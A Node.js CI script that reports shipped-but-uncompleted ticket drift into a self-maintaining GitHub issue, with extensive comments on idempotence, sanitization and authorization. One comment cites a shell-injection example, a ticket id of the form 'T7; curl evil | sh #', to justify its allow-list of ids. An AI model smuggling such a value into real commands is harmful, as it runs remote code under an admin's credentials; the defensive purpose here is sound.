#!/usr/bin/env node
// ceremony-drift.mjs — surface shipped-but-uncompleted rail-freezing tickets.
//
// WHY THIS EXISTS
// A ticket that ships while freezing rails must be marked `completed: true` for
// its rails to expire (T36). Nothing performed or surfaced that step, so drift
// accumulated silently and old rails kept freezing unrelated future work — the
// failure that blocked PR #196 and motivated #198/#200. `ticket-prune` made the
// drift VISIBLE (its `needsCeremony` set) and gave it a remedy (`--ceremony`),
// but detection still depended on a human remembering to look. This closes that
// loop: the set is now checked on a schedule and after every merge to main.
//
// WHY IT IS NOT A BLOCKING GATE
// An ordinary PR structurally CANNOT clear this set: rails-guard-ci's
// assertBaseTicketContractsPreserved denies field changes to existing base
// tickets, which is exactly why PR #200 left the one-time sweep out. A PR-level
// hard failure would therefore block every contributor on drift none of them can
// fix, and the only unblock would be an admin sweep — a gate people learn to
// route around. (Habituating operators to a bypass is the erosion #162 was
// about; this must not recreate it.) So this reports into a tracking issue, and
// the mere EXISTENCE of drift never fails the job. An operational failure of the
// reporter itself (revoked token, gh/API error) DOES exit non-zero — see the
// exit-code contract at the bottom. The authoritative, unbypassable rail
// enforcement stays in scripts/rails-guard-ci.mjs.
//
// Idempotence is the whole design constraint: an unchanged drift set must leave
// the issue untouched, or the signal becomes noise and gets muted.

import { execFileSync } from 'node:child_process';
import { runTicketPrune } from '../packages/ticket-prune/lib/run.mjs';
import { resolveActiveTicketId } from '../packages/tickets/lib/pointer.mjs';

// The DURABLE identity of the managed issue. Labels can be stripped by hand; the
// marker survives in the body, and findExistingIssue falls back to sweeping open
// issues for it (then re-attaches the label).
export const MARKER = '<!-- adlc:ceremony-drift -->';

// Discovery is by LABEL, not by scanning recent issues. A bounded scan of the N
// most recent open issues silently breaks both contracts once the tracker ages
// out of the window: non-empty drift opens a duplicate, and cleared drift never
// finds the issue to close, leaving a false warning open forever. Filtering by a
// dedicated label means the result set only ever contains this job's own issue,
// so lookup stays deterministic no matter how large the repo gets.
export const LABEL = 'ceremony-drift';

// The read-only review command. Always safe to run; it only prints the drift set.
const DRY_RUN_CMD = 'adlc ticket-prune --base-ref origin/main        # dry run: review the set';

// The completion command is PER-TICKET and canonical, not a bulk sweep.
//
// `adlc-tickets complete <id> --write --authorize --json` goes through
// TicketService's transaction: it completes exactly the named ticket, validates
// the expected snapshot (CAS), holds the worktree lock, journals, and records
// completion evidence to `.adlc/manifest.jsonl`. Works on both backends.
//
// This replaces two earlier remedies, and fixes what each got wrong:
//   - the bulk `ticket-prune --ceremony`, which recomputed its own target set at
//     run time (no ids, no revision) — so a ticket that landed after this issue
//     was reviewed could be swept in (a TOCTOU window), and it had no per-ticket
//     filter (one heuristic entry tainted the whole set);
//   - the directory-store raw-edit ("add completed:true to each shard"), which
//     bypassed the lock, CAS, journal, and manifest evidence the directory
//     contract requires, and was not "the same minimal diff" it claimed to be.
//
// The UMBRELLA command, `adlc ticket …`, not the package-internal `adlc-tickets`
// bin. `@adlc/cli` publishes only the `adlc` binary; `adlc-tickets` is a
// dependency bin not guaranteed on an operator's PATH, so a copy-pasted
// `adlc-tickets …` can stop at `command not found` and leave rails frozen. `adlc
// ticket` routes local/store verbs (including `complete`) to @adlc/tickets.
//
// `--json` is REQUIRED, not cosmetic: on a legacy store the CLI otherwise offers
// an interactive migration before mutating (offerLegacyMigration, gated on a TTY
// and `!--json`). An admin who accepted that prompt would migrate the WHOLE store
// before completing one ticket — a repo-wide change outside the reviewed diff.
// `--json` makes the command non-interactive, so it does exactly what is
// advertised: complete one ticket, nothing else.
const completeCmd = (id) => `adlc ticket complete ${id} --write --authorize --json`;

// A ticket id is interpolated into a copy-paste shell command in a bot-authored
// issue. The id comes from the repo (a merged ticket), and the store validator
// accepts arbitrary strings — so an id like `T7; curl evil | sh #` would render
// as executable shell for an admin holding credentials. Only ids matching this
// conservative shape (every real id does: T7, A142, T-01KX…, T-CC1) are rendered
// as runnable commands; anything else is surfaced without a command instead of
// being quoted-and-hoped. No shell metacharacter can pass this gate, so no
// quoting is needed and injection is structurally impossible.
// Must START with an alphanumeric, so an id can never be parsed as a flag
// (`--authorize`, `-x`) even though those contain only otherwise-allowed
// characters. Every real id qualifies (T7, A142, T-CC1, T-01KX…).
// Length-bounded as well as charset-bounded. The store accepts arbitrarily long
// ids, and a confirmed id is interpolated RAW into the fenced command (it must be
// — the command has to name the real id), where mdField's display clamp does not
// reach. A very long id would bloat the issue body and eventually exceed GitHub's
// ~65_536-byte limit, failing every create/update and silently disabling the
// reporter. 128 is far above any real id (the longest here is a 26-char ULID
// suffix) and far below any single-field body-size risk.
const MAX_TICKET_ID = 128;
// Per-ticket rail display cap (see rowsFor): bounds one ticket's contribution to
// the body regardless of how many rails it declares.
const MAX_RAILS_SHOWN = 25;
const SAFE_TICKET_ID = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;
const isRenderableId = (id) =>
  typeof id === 'string' && id.length <= MAX_TICKET_ID && SAFE_TICKET_ID.test(id);

// Every ticket field rendered into the issue body is UNTRUSTED — ids, rails, and
// reasons all trace back to a merged ticket, and the store accepts arbitrary
// strings. Interpolating them raw into Markdown lets a crafted value break out of
// its heading or code span: a newline can start a NEW block — including a ```bash
// fence containing an authoritative-looking command — and structural characters
// can forge links or headings. The runnable-command allow-list (SAFE_TICKET_ID)
// only guards the command line; this guards every OTHER place a field is shown.
//
// Two-layer defense:
//   1. remove ALL control characters (newlines, tabs, CR) — without a line break
//      no new block, fence, heading, or standalone line can be introduced at all;
//   2. escape the inline-Markdown metacharacters that remain, so a value cannot
//      forge a code span, link, or emphasis within its own line.
// Applied to every interpolated field. Values are also clamped in length so one
// pathological ticket cannot dominate the issue.
const mdField = (value, { max = 200 } = {}) =>
  String(value ?? '')
    .replace(/[\u0000-\u001f\u007f]/g, ' ') // (1) strip control chars -> no new blocks
    .replace(/[\\`*_{}\[\]()#+!|<>]/g, (c) => `\\${c}`) // (2) escape inline-MD metacharacters
    .slice(0, max)

/**
 * Render the tracking-issue body. Deterministic: entries are sorted by id, so an
 * unchanged drift set always produces a byte-identical body and decideAction can
 * compare bodies to decide whether anything actually changed.
 * @param {{id?: string, reason?: string, rails?: string[], blocker?: string}[]} needsCeremony
 */
export function renderIssueBody(needsCeremony, { activeTicketId = null, activeTicketUnknown = false } = {}) {
  const entries = [...(needsCeremony ?? [])].sort((a, b) =>
    String(a?.id ?? '').localeCompare(String(b?.id ?? ''))
  );

  const rowsFor = (list) =>
    list.map((t) => {
      const rails = Array.isArray(t?.rails) ? t.rails : [];
      // Each field is sanitized: ids/rails/reasons are untrusted (see mdField).
      // Rails are also COUNT-bounded: a ticket may declare arbitrarily many, and
      // without a cap one ticket's rail list could bloat the body toward GitHub's
      // size limit. Show the first MAX_RAILS_SHOWN, then say how many were omitted
      // (never a silent truncation).
      const shown = rails.slice(0, MAX_RAILS_SHOWN).map((r) => `\`${mdField(r)}\``);
      const omitted = rails.length - shown.length;
      const railList = rails.length
        ? shown.join(', ') + (omitted > 0 ? `, _…and ${omitted} more_` : '')
        : '_(none)_';
      return [
        `### ${t?.id != null ? mdField(t.id) : '(unknown id)'}`,
        '',
        `- **Blocker:** \`${mdField(t?.blocker ?? 'unknown')}\``,
        `- **Frozen rails:** ${railList}`,
        `- **Detected because:** ${t?.reason != null ? mdField(t.reason) : '(no reason recorded)'}`,
      ].join('\n');
    });

  // The two blockers need DIFFERENT remedies, and conflating them produces an
  // issue that can never close: `ticket-prune --ceremony` completes only
  // 'rails-freeze' entries. A 'preexisting-completed-field' ticket would require
  // overwriting a deliberately-set `completed` value — a riskier field mutation
  // kept deliberately out of scope (see run.mjs) — so it stays in needsCeremony
  // no matter how many times the advertised command is run. Telling an operator
  // that one command clears everything listed would be false instructions that
  // never stop being wrong.
  const railsFreeze = entries.filter((t) => t?.blocker === 'rails-freeze');
  const manual = entries.filter((t) => t?.blocker !== 'rails-freeze');

  // EVIDENCE STRENGTH — presentation only. It sorts entries so a reader can see
  // at a glance which claims are solid, but it does NOT gate anything: see "why
  // this report never certifies the command" below for why a gate computed here
  // cannot hold.
  //
  // classifyTicket() reports two very different things under one `stale` flag:
  //   explicit status: "done"  -> the ticket SAYS it is finished. Authoritative.
  //   inferred: all N scope glob(s) resolve to tracked files on the base ref
  //                            -> a HEURISTIC. It is also exactly what an ACTIVE
  //                               ticket looks like when its work touches paths
  //                               that already exist, which is the common case.
  //
  // Classification is still an ALLOW-LIST: only an explicit done-status counts as
  // confirmed. Inferred, missing, malformed, or renamed reason strings all sort
  // into "needs confirmation", so a change upstream degrades toward more caution
  // in the report rather than less.
  const isConfirmedDone = (t) =>
    !activeTicketUnknown && String(t?.reason ?? '').startsWith('explicit status:');
  const isActive = (t) => activeTicketId != null && t?.id === activeTicketId;

  const activeEntries = railsFreeze.filter(isActive);
  const confirmed = railsFreeze.filter((t) => !isActive(t) && isConfirmedDone(t));
  const unconfirmed = railsFreeze.filter((t) => !isActive(t) && !isConfirmedDone(t));

  // A ready-to-run completion command is offered ONLY for confirmed entries —
  // rail-freezing tickets that carry an explicit done-status and are not the
  // active ticket. Because each command names one id, a heuristic or active entry
  // elsewhere in the set cannot be swept in: there is no all-or-nothing gate to
  // get wrong. Heuristic entries (`inferred:` — scope already resolves,
  // indistinguishable from an active ticket editing existing files) simply do not
  // get a ready command; they are listed under "Needs confirmation" with the
  // generic form, to be run only after a human verifies each one.
  //
  // `confirmed` is derived from the ticket's committed `status` field, visible in
  // every checkout — NOT from the active-ticket pointer, which a CI checkout
  // cannot see (it is gitignored). That distinction is why the earlier
  // pointer-dependent gate was unsound and this is not.
  // confirmed = rail-freezing, explicit-done, not active. Split by whether the id
  // can be safely rendered into a shell command (see SAFE_TICKET_ID). An id that
  // fails the gate still gets surfaced — just never as executable text.
  const completable = confirmed.filter((t) => isRenderableId(t?.id));
  const unsafeIds = confirmed.filter((t) => !isRenderableId(t?.id));

  // WHY THIS REPORT NEVER CERTIFIES THE COMMAND AS SAFE TO RUN
  //
  // Earlier revisions gated a ready-to-run bulk command on a `bulkIsSafe` check
  // computed here. That certification cannot be sound, for two independent
  // reasons, and a bot-filed instruction saying "safe to run as-is" is acted on:
  //
  //   1. TIME. This renders a snapshot at commit A. The command carries no ticket
  //      IDs and no revision, and recomputes the stale set when the operator runs
  //      it — possibly much later, against a moved checkout. A ticket added after
  //      this issue was written enters the write set without ever appearing in the
  //      report that called it safe. Workflow concurrency serializes the runs, not
  //      the human action afterwards.
  //
  //   2. PLACE. The active-ticket quarantine reads `.adlc/current-ticket.json`,
  //      which is gitignored and untracked. In the fresh CI checkout this job runs
  //      in, the file is simply ABSENT — which resolves cleanly to "no active
  //      ticket" rather than to "unknown". So CI reads an empty checkout as proof
  //      that nothing is in flight, while real activity lives in contributors'
  //      local worktrees where this job cannot see it.
  //
  // Both make CI the wrong vantage point to authorize a destructive bulk action.
  // So the report does what it can honestly do — name the drift and its evidence
  // — and hands the safety decision to the point of execution, where the local
  // pointer and the current tree are both visible. The procedure is documented
  // with its preconditions rather than presented as a vetted one-liner.
  //
  // The stronger fix belongs in ticket-prune: a revision-bound, per-ticket
  // ceremony (explicit IDs + expected HEAD, refusing if the candidate set moved).
  // That is a CLI contract change and is deliberately not attempted here.

  const sections = [];

  if (activeEntries.length) {
    sections.push(
      `## ⚠ Currently active — do NOT complete (${activeEntries.length})`,
      '',
      'The active-ticket pointer names this ticket, so work on it is presumably in',
      'flight. It appears here only because its declared scope already resolves to',
      'tracked files, which is what in-progress work on existing paths looks like.',
      '',
      '**Completing it would expire its rails while it is still being built.**',
      '',
      'The ceremony command has no per-ticket filter — it completes every stale',
      'rail-freezing ticket it finds, including this one. It is not excluded by',
      'listing it here. If it is genuinely finished, clear the active-ticket',
      'pointer first; otherwise complete the other tickets individually.',
      '',
      ...rowsFor(activeEntries),
      ''
    );
  }

  if (confirmed.length) {
    sections.push(
      `## Explicitly done (${confirmed.length})`,
      '',
      'These carry an explicit done-shaped `status`, so the ticket itself asserts it',
      'is finished. Under T36 rails expire only once a ticket is marked `completed: true`,',
      'so until then they keep freezing paths for unrelated work.',
      '',
      '`rails-guard-ci.assertBaseTicketContractsPreserved` denies field changes to',
      'existing base tickets, so an ordinary PR cannot complete a railed ticket. This',
      'is reserved for the protected-base admin ceremony — see the procedure below.',
      '',
      ...rowsFor(confirmed),
      ''
    );
  }

  if (unconfirmed.length) {
    sections.push(
      `## Needs confirmation before completing (${unconfirmed.length})`,
      '',
      'These have **no explicit done-status**. Most were inferred shipped only',
      'because every declared scope glob already resolves to a tracked file — which',
      'is equally true of an active ticket whose work touches existing paths. That',
      'evidence cannot distinguish "finished" from "in progress on existing files".',
      'Entries whose evidence could not be read at all land here too, deliberately.',
      ...(activeTicketUnknown
        ? ['',
           '> The active-ticket pointer could not be resolved on this run, so **every**',
           '> entry is listed here: without knowing which ticket is in flight, none can',
           '> be advertised as safe to bulk-complete.']
        : []),
      '',
      'Completing a ticket expires its rails, so confirm each one is genuinely done',
      'before including it. The ceremony command has no per-ticket filter: if any of',
      'these is not finished, complete the finished ones individually instead.',
      '',
      ...rowsFor(unconfirmed),
      ''
    );
  }

  if (manual.length) {
    sections.push(
      `## Needs a manual decision (${manual.length})`,
      '',
      'These carry a `completed` field that is present but not `true`. The completion',
      'ceremony will **not** clear them — completing them means overwriting a value',
      'someone set deliberately, which it refuses to do by design. Decide per ticket',
      'whether the field is stale (set it to `true` via the protected-base path) or',
      'the ticket genuinely is not done (leave it, and it will keep being reported',
      'here until it is completed or its scope changes).',
      '',
      ...rowsFor(manual),
      ''
    );
  }

  // A PROCEDURE with preconditions, never a vetted one-liner: see the "never
  // certifies" note above. The remedy is the same on both backends — the
  // canonical per-ticket completion works identically on tickets.json and the
  // directory store — so there is no backend branch here.
  const procedure = !railsFreeze.length
    ? []
    : [
        '## Clearing these',
        '',
        '> **Protected-base admin action.** Completing a rail-freezing ticket expires',
        "> its rails, and rails-guard-ci denies that diff on an ordinary PR, so these",
        '> land on `main` the way other protected-base ticket changes do.',
        '>',
        '> **This check runs in CI and cannot see whether a ticket is still being',
        "> built** — `.adlc/current-ticket.json` is gitignored, so a CI checkout never",
        '> has one and an empty checkout looks identical to "nothing in progress".',
        '> Run the review from a checkout where your active-ticket pointer lives, and',
        '> confirm each id is genuinely finished before completing it.',
        '',
        'Review the current drift set (read-only — expires no rails):',
        '',
        '```bash',
        DRY_RUN_CMD,
        '```',
        '',
        ...(completable.length
          ? [
              'Complete each finished ticket individually. Each command below is bound to',
              "one id, goes through the store's transaction (lock + expected-snapshot",
              'check), and records completion evidence to `.adlc/manifest.jsonl` — it',
              'completes exactly that ticket and nothing else:',
              '',
              '```bash',
              ...completable.map((t) => completeCmd(t.id)),
              '```',
              '',
            ]
          : []),
        ...(unconfirmed.length
          ? [
              (completable.length ? 'The' : 'No ready command is offered: the') +
                ` ${unconfirmed.length} ticket(s) under "Needs confirmation" were inferred` +
                ' shipped only because their scope already resolves to tracked files —',
              'indistinguishable from an active ticket editing existing files. Give each',
              'genuinely-done ticket an explicit done-`status` so it appears above, or, once',
              'you have verified one by hand, complete just that id:',
              '`adlc ticket complete <id> --write --authorize --json`.',
              '',
            ]
          : []),
        ...(unsafeIds.length
          ? [
              `⚠ ${unsafeIds.length} confirmed ticket(s) have an id that cannot be safely`,
              'rendered as a shell command (it contains characters outside',
              '`[A-Za-z0-9._-]`). No command is shown for them, deliberately — an id is',
              'interpolated into copy-paste shell, and a crafted id could inject. Complete',
              'them through tooling that takes the id as a real argument, and consider',
              // These ids failed SAFE_TICKET_ID, so they DO contain metacharacters —
              // sanitizing here is the whole point, not a formality.
              `renaming: ${unsafeIds.map((t) => '`' + mdField(t?.id) + '`').join(', ')}.`,
              '',
            ]
          : []),
      ];

  const body = [
    MARKER,
    '',
    'Shipped tickets whose declared scope resolves to tracked files on `main`, but',
    'which are still active in the ticket store.',
    '',
    ...sections,
    ...procedure,
    '---',
    '',
    '_Maintained automatically by `.github/workflows/ceremony-drift.yml`. This issue',
    'closes on its own once the set is empty; edits to the body are overwritten._',
  ].join('\n');

  return clampBody(body);
}

// FINAL BACKSTOP against GitHub's ~65_536-byte issue-body limit. Per-field and
// per-rail caps bound each entry, but the NUMBER of drifting tickets is itself
// unbounded, so a large enough set could still overflow — and an over-limit body
// fails every create/update, silently disabling the reporter. If the assembled
// body exceeds MAX_BODY, cut at a line boundary and append a visible notice. The
// MARKER survives (it is at the top), so issue discovery still works, and the cut
// is deterministic, so decideAction's idempotence holds.
export const MAX_BODY = 60_000; // headroom under GitHub's limit for the notice
function clampBody(body) {
  if (body.length <= MAX_BODY) return body;
  const notice =
    '\n\n---\n\n> ⚠ This issue was truncated: the full drift set exceeds GitHub\'s ' +
    'issue-body size limit. Run `adlc ticket-prune --base-ref origin/main` locally ' +
    'to see every entry.';
  const budget = MAX_BODY - notice.length;
  const cut = body.lastIndexOf('\n', budget);
  return body.slice(0, cut > 0 ? cut : budget) + notice;
}

/**
 * Title reflects the count so the drift is legible from a notification alone.
 * Deliberately does NOT say "freezing rails": a 'preexisting-completed-field'
 * entry always has `rails: []` (ceremonyDisposition checks non-empty rails
 * first), so that phrasing would be false whenever such an entry is present.
 */
export function renderIssueTitle(needsCeremony) {
  const n = (needsCeremony ?? []).length;
  return `Ticket ceremony drift: ${n} shipped ticket${n === 1 ? '' : 's'} awaiting completion`;
}

/**
 * Pick this job's tracking issue out of the open-issue list by its embedded
 * marker. Pure so it is testable without a GitHub token — and it must be tested:
 * if this ever fails to match an issue that exists, the job opens a DUPLICATE on
 * every run, which is precisely the churn the idempotence design exists to
 * prevent. Tolerates entries with a missing/non-string body (the API shape is
 * not guaranteed) rather than throwing mid-run.
 * @param {{number: number, title?: string, body?: unknown}[]} issues
 */
/**
 * Reduce every rendering of one actor to a single identity (#265).
 *
 * GitHub names the same App actor three ways, and which one you get depends on
 * the API you asked and the gh version that formatted it:
 *
 *   github-actions[bot]   REST, and older gh
 *   app/github-actions    GraphQL via `gh issue list --json author` (current)
 *   github-actions        the bare GraphQL Bot `login`
 *
 * Comparing raw strings therefore matched a name nothing in this job actually
 * receives: the author filter rejected the tracker gh reports, findExistingIssue
 * returned null on BOTH paths, and decideAction opened a duplicate on every push
 * to main. Normalizing at the comparison — rather than correcting the constant to
 * today's rendering — is what makes the next gh formatting change a non-event.
 */
export function normalizeActorLogin(login) {
  return String(login ?? '')
    .trim()
    .toLowerCase()
    .replace(/^app\//, '')
    .replace(/\[bot\]$/, '');
}

/** True when a login is written in one of GitHub's bot-actor forms. */
const isBotFormLogin = (login) => /^app\//.test(String(login ?? '')) || /\[bot\]$/.test(String(login ?? ''));

/**
 * Authorship check for the unlabeled sweep. Two acceptance routes, deliberately
 * NOT equally strict, because they carry different risk.
 *
 * EXACT match against a configured entry is explicit operator intent. It accepts
 * only what someone literally wrote into ADLC_DRIFT_AUTHORS, widens nothing, and
 * so needs no further evidence. This route is load-bearing: the override is
 * documented for "repos whose automation runs under a different identity", which
 * in practice is usually a dedicated MACHINE USER — reported with
 * `is_bot: false`. Demanding bot-ness here would reject that configured author
 * and recreate #265 under the override.
 *
 * NORMALIZED match is the route that widens: it accepts logins nobody configured,
 * on the strength of one login aliasing onto another. That is exactly where
 * impersonation becomes possible — stripping '[bot]' means a human account named
 * `github-actions` would alias onto the managed bot and could have its issue
 * seized by a job holding `issues: write`. The exact-string comparison this
 * replaces did not have that hole, and a fix must not widen the authorization it
 * was meant to repair, so bot evidence is required on this route only. `is_bot`
 * absent means not provably a bot, which fails closed.
 */
function isManagedAuthor(author, authors) {
  const login = author?.login;
  if (!login) return false;

  const lower = String(login).trim().toLowerCase();
  if (authors.some((a) => String(a).trim().toLowerCase() === lower)) return true;

  const normalized = normalizeActorLogin(login);
  if (!authors.some((a) => normalizeActorLogin(a) === normalized)) return false;
  return author?.is_bot === true || isBotFormLogin(login);
}

export function selectTrackingIssue(issues, { authors = null, requireMarker = true } = {}) {
  // The marker is the identity on the UNLABELED sweep, where nothing else
  // distinguishes this job's issue. On the labeled path it must NOT be required:
  // a maintainer editing the body can delete the invisible comment while leaving
  // the label intact, and demanding the marker there would orphan a correctly
  // labeled tracker — opening a duplicate under drift, or never closing it once
  // drift clears. The canonical body (marker included) is restored on the next
  // update, which is what the footer promises.
  let candidates = requireMarker
    ? (issues ?? []).filter((i) => typeof i?.body === 'string' && i.body.includes(MARKER))
    : [...(issues ?? [])].filter(Boolean);

  // AUTHORIZATION. The marker is public: it is visible in the rendered issue and
  // trivially copied. Treating "body contains the marker" as authority to seize
  // an issue would let any user who can open one get it labeled, rewritten, or
  // closed by a job holding `issues: write`, and would let a forged issue divert
  // management away from the real tracker. So on the unlabeled sweep the author
  // must also be one this job could plausibly have created the issue as.
  // Compared through normalizeActorLogin, never as raw strings — see #265, where
  // an exact-string match against a name gh does not emit made this filter reject
  // the job's own tracker and open a duplicate on every run.
  if (authors) candidates = candidates.filter((i) => isManagedAuthor(i?.author, authors));

  // Ambiguity fails closed rather than picking one. Two marked issues means
  // something is wrong (a forgery, or a genuine duplicate); guessing could
  // overwrite or close the wrong one, and both are destructive under
  // `issues: write`.
  if (candidates.length > 1) {
    throw new Error(
      `ambiguous tracking issue: ${candidates.length} open issues carry the marker ` +
        `(#${candidates.map((i) => i.number).join(', #')}). Refusing to guess — ` +
        `close or unmark the extras, or re-label the correct one.`
    );
  }

  return candidates[0] ?? null;
}

/**
 * Decide what to do with the tracking issue. Pure — no I/O — so the idempotence
 * and close-on-clear contracts are testable without a GitHub token.
 * @param {{drift: object[], existingIssue: {number: number, title: string, body: string} | null}} input
 */
export function decideAction({ drift, existingIssue, activeTicketId = null, activeTicketUnknown = false }) {
  const entries = drift ?? [];

  if (entries.length === 0) {
    return existingIssue
      ? { action: 'close', number: existingIssue.number }
      : { action: 'noop' };
  }

  const title = renderIssueTitle(entries);
  const body = renderIssueBody(entries, { activeTicketId, activeTicketUnknown });

  if (!existingIssue) return { action: 'open', title, body };

  // Compare BOTH: a count change moves the title while the body may still
  // differ, and either drifting from the current set means the issue is stale.
  const unchanged = existingIssue.title === title && existingIssue.body === body;
  return unchanged
    ? { action: 'noop' }
    : { action: 'update', number: existingIssue.number, title, body };
}

// ---- I/O shell (deliberately branch-free; all decisions live above) ----

const gh = (args, input) =>
  execFileSync('gh', args, { encoding: 'utf8', input, maxBuffer: GH_MAX_BUFFER });

/** Idempotent; --force makes re-creating an existing label a no-op. */
function ensureLabel() {
  gh(['label', 'create', LABEL, '--force', '--color', 'B60205',
    '--description', 'Shipped tickets whose rails have not expired (managed by ceremony-drift.yml)']);
}

// Sanity bound for the unlabeled sweep. Far above any plausible open-issue count
// for this repo; if it is ever hit, the labeled lookup above is the load-bearing
// path anyway.
const SWEEP_LIMIT = 1000;

// Issue bodies are unbounded; 1000 of them can exceed a default buffer and make
// every run fail. Generous, and paired with the truncation warning below.
const GH_MAX_BUFFER = 128 * 1024 * 1024;

// Applying the label requires write access, so a labeled issue is already an
// authorization signal. The unlabeled sweep has no such signal and must verify
// authorship instead — see selectTrackingIssue. Overridable for tests and for
// repos whose automation runs under a different identity.
export const MANAGED_AUTHORS = (process.env.ADLC_DRIFT_AUTHORS ?? 'github-actions[bot]')
  .split(',')
  .map((s) => s.trim())
  .filter(Boolean);

const ISSUE_FIELDS = 'number,title,body,author';

function findExistingIssue() {
  // Fast path: label-scoped, so this set contains only this job's own issue(s)
  // and stays deterministic no matter how large the repo gets.
  const labeled = selectTrackingIssue(
    JSON.parse(gh(['issue', 'list', '--state', 'open', '--label', LABEL, '--limit', '100',
      '--json', ISSUE_FIELDS])),
    { authors: MANAGED_AUTHORS, requireMarker: false }
  );
  if (labeled) return labeled;

  // Fallback: the label can be removed by hand, and label-only lookup would then
  // open a duplicate (active drift) or never close the stale issue (cleared
  // drift). The marker is the durable identity, so sweep open issues for it —
  // but only accept one this job could have authored (the marker is public).
  const swept = JSON.parse(gh(['issue', 'list', '--state', 'open', '--limit', String(SWEEP_LIMIT),
    '--json', ISSUE_FIELDS]));
  const unlabeled = selectTrackingIssue(swept, { authors: MANAGED_AUTHORS });

  if (!unlabeled) {
    // FAIL CLOSED on a truncated scan. If the sweep filled its window without a
    // match, "not found" is unknown, not false — an older unlabeled tracker may
    // sit beyond it. Returning null would make the caller act on that unknown:
    // opening a duplicate when drift exists, or leaving an obsolete warning open
    // once drift clears — the two failures this recovery path exists to prevent.
    //
    // An earlier revision logged a warning here and returned null anyway. Making
    // a bad inference LOUD is not the same as not making it; the caller still
    // could not tell a truncated miss from an exhaustive one. Throwing keeps the
    // distinction, and the exit-code contract turns it into a visibly failed run
    // with no issue mutation rather than a silently wrong one.
    if (swept.length >= SWEEP_LIMIT) {
      throw new Error(
        `scanned the ${SWEEP_LIMIT} most recent open issues without finding a tracker, and the ` +
          `scan hit that limit — an older unlabeled tracker may exist beyond it, so whether one ` +
          `exists is unknown. Refusing to open or close anything. Re-apply the '${LABEL}' label ` +
          `to the tracker to restore the fast path, or raise SWEEP_LIMIT.`
      );
    }
    return null; // scan was exhaustive: genuinely no tracker
  }

  // Self-heal so the fast path works again next run.
  gh(['issue', 'edit', String(unlabeled.number), '--add-label', LABEL]);
  console.log(`ceremony-drift: re-attached '${LABEL}' to issue #${unlabeled.number}`);
  return unlabeled;
}

async function main() {
  const result = runTicketPrune({ cwd: process.cwd(), baseRef: process.env.BASE_REF || 'origin/main' });
  if (!result.ok) {
    // OPERATIONAL failure — the reporter itself could not do its job. This must
    // be loud (see the exit-code contract in main's catch below).
    console.error(`ceremony-drift: could not compute drift — ${result.error}`);
    process.exitCode = 1;
    return;
  }

  const drift = result.needsCeremony ?? [];
  console.log(`ceremony-drift: ${drift.length} ticket(s) awaiting the completion ceremony`);
  for (const t of drift) console.log(`  - ${t.id} (${t.blocker})`);

  // Resolved BEFORE the dry-run return, so a dry run previews the most
  // safety-relevant fact rather than hiding it: which ticket is excluded from
  // bulk-completion advice because completing it would expire the rails of work
  // still in flight. If the pointer cannot be read the design still degrades
  // safely — without an explicit done-status a ticket lands in "needs
  // confirmation", which never advertises the bulk command.
  // resolveActiveTicketId returns a RESULT ({ok, value}) and does not throw —
  // a malformed or conflicting pointer comes back as ok:false (the fail-closed
  // contract from #196). Reading it as a bare id yields an object, which would
  // never equal a ticket id and would silently disable the exclusion entirely.
  const resolvedActive = resolveActiveTicketId({ root: process.cwd() });
  const activeTicketUnknown = !resolvedActive.ok;
  const activeTicketId = resolvedActive.ok ? (resolvedActive.value?.id ?? null) : null;

  if (activeTicketUnknown) {
    // We cannot tell which ticket is in flight, so we cannot tell which one the
    // bulk command would wrongly complete. Suppress that advice entirely.
    console.log(
      `ceremony-drift: active-ticket pointer unresolvable (${resolvedActive.code ?? 'error'}); ` +
        `suppressing bulk-completion advice`
    );
  } else if (activeTicketId) {
    console.log(`ceremony-drift: active ticket is ${activeTicketId} (excluded from bulk advice)`);
  }

  if (process.env.DRY_RUN === '1') {
    console.log(`ceremony-drift: DRY_RUN=1, no issue changes`);
    return;
  }

  ensureLabel();
  const decision = decideAction({ drift, existingIssue: findExistingIssue(), activeTicketId, activeTicketUnknown });
  switch (decision.action) {
    case 'open': {
      const url = gh(['issue', 'create', '--title', decision.title, '--label', LABEL, '--body-file', '-'], decision.body).trim();
      console.log(`ceremony-drift: opened ${url}`);
      break;
    }
    case 'update':
      gh(['issue', 'edit', String(decision.number), '--title', decision.title, '--body-file', '-'], decision.body);
      console.log(`ceremony-drift: updated issue #${decision.number}`);
      break;
    case 'close':
      gh(['issue', 'close', String(decision.number), '--comment',
        'Ceremony drift cleared — no shipped ticket is still freezing rails. Closing automatically.']);
      console.log(`ceremony-drift: closed issue #${decision.number} (drift cleared)`);
      break;
    default:
      console.log('ceremony-drift: no issue change needed');
  }
}

// Only run main() when executed directly, so the test can import the pure parts.
if (process.argv[1] && import.meta.url === `file://${process.argv[1]}`) {
  main().catch((e) => {
    // EXIT-CODE CONTRACT — two different failures, deliberately treated apart:
    //
    //   drift EXISTS            -> exit 0. Not a malfunction; it is the normal
    //                             finding, and failing on it would recreate the
    //                             blocking-gate problem this job exists to avoid.
    //   the REPORTER is broken  -> exit 1. A revoked token, a gh/API failure, or
    //                             a CLI incompatibility must be visible.
    //
    // The earlier version swallowed both, reasoning "a reporter must never fail".
    // That rationale only ever applied to the first case: this workflow does not
    // run on pull_request, so a non-zero exit blocks nobody — it just surfaces a
    // broken job. Swallowing the second case let the reporter die silently while
    // every scheduled run still looked green, which defeats its only purpose.
    console.error(`ceremony-drift: ${e.message}`);
    process.exitCode = 1;
  });
}
